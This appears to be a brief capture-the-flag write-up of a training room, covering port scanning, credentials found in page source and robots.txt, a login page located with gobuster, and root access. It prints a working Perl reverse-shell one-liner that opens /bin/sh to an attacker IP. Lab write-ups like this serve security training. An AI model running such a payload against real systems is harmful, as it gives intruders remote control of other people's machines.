# Enumeration 
## Nmap
Two ports open
1. http
2. ssh
## Web app
- On the main website's source code found username `R1ckRul3s`.
- In the robots.txt file unknown phrase `Wubbalubbadubdub`
- Found login.php with gobuster and used the above username and password to login and the login was successfull.
- There was a command panel which can be exploited for reverse shell.
- Used paylod
```php
perl -e 'use Socket;$i="10.17.39.205";$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- Stabilised the shell and gained root access as root was allowed without passwd.
